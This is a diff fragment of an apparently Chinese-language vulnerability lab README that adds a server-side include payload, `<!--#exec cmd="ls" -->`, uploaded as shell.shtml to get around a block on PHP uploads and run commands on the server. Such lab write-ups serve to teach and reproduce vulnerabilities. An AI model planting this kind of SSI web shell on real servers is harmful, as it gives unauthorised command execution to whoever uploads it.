@@ -21,6 +21,10 @@ docker-compose up -d
 
 正常上传PHP文件是不允许的，我们可以上传一个shell.shtml文件：
 
+```shtml
+<!--#exec cmd="ls" -->
+```
+
 ![](1.png)
 
 成功上传，然后访问shell.shtml，可见命令已成功执行：
